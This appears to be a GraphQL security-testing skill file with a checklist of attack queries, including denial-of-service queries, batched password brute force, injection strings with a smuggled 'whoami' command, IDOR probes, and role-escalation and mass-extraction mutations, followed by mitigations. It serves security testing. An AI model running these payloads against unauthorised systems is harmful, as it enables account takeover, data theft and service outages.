---
name: GraphQL Security Testing
category: web-exploit
version: "1.0"
author: "DeepHunt"
description: "GraphQL API security testing and vulnerability exploitation"
tags:
  - graphql
  - api-security
  - introspection
  - injection
---

# GraphQL Security Testing

## Overview

GraphQL APIs have unique security concerns including injection, authorization bypass, denial of service, and information disclosure.

## Testing Checklist

### 1. Introspection Endpoints

**Common Paths:**
- `/graphql`
- `/api/graphql`
- `/query`
- `/graphiql`
- `/playground`

**Enable Introspection:**
```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

**Tools:**
- graphql-inspector
- altair graphql client
- Burp Suite GraphQL support

### 2. Alias-Based DoS

**Vulnerability:** Unlimited aliases can cause resource exhaustion

```graphql
query {
  a1: grandchild { id }
  a2: grandchild { id }
  a3: grandchild { id }
  # ... repeat thousands of times
  a9999: grandchild { id }
}
```

**Mitigation:** Limit query depth and complexity

### 3. Field Duplication DoS

```graphql
query {
  user {
    posts {
      comments {
        author {
          posts {
            comments { author { id } }
          }
        }
      }
    }
  }
}
```

### 4. Batched Attacks

**Brute Force via Batching:**
```graphql
query {
  u1: login(username: "admin", password: "pass1")
  u2: login(username: "admin", password: "pass2")
  u3: login(username: "admin", password: "pass3")
}
```

### 5. Injection via Resolvers

**Test for NoSQL injection:**
```graphql
query {
  user(id: "5f4dcc3b5aa765d61d8327deb882cf99' OR '1'='1")
}
```

**Test for command injection:**
```graphql
query {
  ping(cmd: "127.0.0.1; whoami")
}
```

### 6. Authorization Bypass

**IDOR via GraphQL:**
```graphql
# Get your own user
query { me { id name email } }

# Try to access other users by manipulating ID
query { user(id: "123") { name email } }
```

**Bypass with nested queries:**
```graphql
query {
  user(id: "123") {
    posts {
      comments {
        author {
          # Check if you can see other users' private data
          secret_data
        }
      }
    }
  }
}
```

### 7. Error-Based Information Disclosure

**Force detailed errors:**
```graphql
query {
  thisFieldDoesNotExist {
    alsoDoesNotExist
  }
}
```

**Exploit stack traces in development mode**

### 8. Mutations for State Changes

**Test all mutations:**
```graphql
mutation {
  createUser(input: { name: "attacker", email: "attacker@test.com" }) {
    id
  }
}

mutation {
  updatePassword(id: "123", newPassword: "hacked") {
    success
  }
}
```

### 9. Field-Level Permissions

**Introspection shows all fields - test access control:**
```graphql
query {
  __type(name: "User") {
    fields {
      name
      type { name }
    }
  }
}
```

### 10. WebSocket Subscriptions

**Test subscription-based attacks:**
```graphql
subscription {
  newMessages(channelId: "123") {
    content
  }
}
```

## Testing Tools

### InQL (Burp Extension)
- GraphQL introspection
- Fuzzing capabilities
- Schema analysis

### GraphQL Voyager
- Visualize schema
- Identify attack surface

### graphql-cop
```bash
python3 graphql-cop.py -t https://target.com/graphql
```

## Exploitation Examples

### Information Disclosure
```graphql
# List all users
query {
  users {
    id
    email
    role
  }
}
```

### Privilege Escalation
```graphql
mutation {
  updateUserRole(id: "123", role: "admin") {
    success
  }
}
```

### Mass Data Extraction
```graphql
query {
  users(limit: 1000) {
    id
    name
    email
    phone
    address
  }
}
```

## Mitigation Checklist

- [ ] Disable introspection in production
- [ ] Implement query depth limiting
- [ ] Implement query complexity analysis
- [ ] Rate limit requests
- [ ] Validate all inputs
- [ ] Implement proper authorization (per-field)
- [ ] Disable stack traces in errors
- [ ] Implement CORS properly
- [ ] Monitor for abuse patterns